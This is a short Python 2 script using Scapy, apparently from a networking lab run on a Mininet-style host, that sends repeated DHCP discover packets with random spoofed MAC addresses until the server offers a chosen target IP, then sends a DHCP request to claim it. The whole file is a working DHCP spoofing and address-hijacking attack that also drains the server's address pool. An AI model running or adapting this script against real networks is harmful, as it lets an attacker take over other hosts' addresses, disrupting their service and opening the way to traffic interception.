from scapy.all import *
import random
localiface = 'h1-eth0'
broadcastMac = 'ff:ff:ff:ff:ff:ff'
broadcastIp = '255.255.255.255'

#Need to use local MAC so can get response? 
def getDHCP(localMac, ipToTake):

    newIp = ''
    count = 0
    fakeMac = ''
    fakeRaw = ''
    curXid = 0

    while newIp != ipToTake:
        count += 1
        fakeMac = ''
        for i in range(6):
            fakeMac += hex(random.randint(0,15))[-1]
            fakeMac += hex(random.randint(0,15))[-1]
            fakeMac += ":"
        fakeMac = fakeMac[:-1]

        fakeRaw = fakeMac.replace(':','').decode('hex')
        localRaw = localMac.replace(':','').decode('hex')
    
        ethPk = Ether(src=fakeMac, dst=broadcastMac)
        ipPk = IP(src='0.0.0.0', dst= broadcastIp)
        udpPk = UDP(dport=67,sport=68)
        curXid = random.randint(0,10000)
        bootPk = BOOTP(chaddr = fakeRaw, xid = curXid)
        dhcpPk = DHCP(options=[('message-type', 'discover'), 'end'])
        discovery = ethPk/ipPk/udpPk/bootPk/dhcpPk
    
        recvPk = srp1(discovery,iface=localiface)
        newIp = recvPk[BOOTP].yiaddr
        print newIp
        print fakeMac
    print "Offered IP is: " 
    print recvPk[BOOTP].yiaddr
    print fakeMac
        
    servIp = recvPk[BOOTP].siaddr
    return (fakeMac, servIp, fakeRaw, curXid, newIp)

conf.checkIPaddr = False
localMac = sys.argv[1]
ipToTake = sys.argv[2]
fakeMac, servIp, fakeRaw, curXid, newIp = getDHCP(localMac, ipToTake)
print newIp
print fakeMac
            

#Request for the DHCP addr
ethPk = Ether(src=fakeMac, dst = 'ff:ff:ff:ff:ff:ff')
ipPk = IP(src = "0.0.0.0", dst = "255.255.255.255")
udpPk = UDP(dport=67, sport=68)
bootPk = BOOTP(chaddr = fakeRaw, xid=curXid)
requestPk = DHCP(options=[("message-type", "request"),
                          ("server_id",servIp), ("requested_addr", newIp), "end"])

fullReq = ethPk/ipPk/udpPk/bootPk/requestPk

recvPk = srp1(fullReq, iface=localiface)

print newIp
print fakeMac
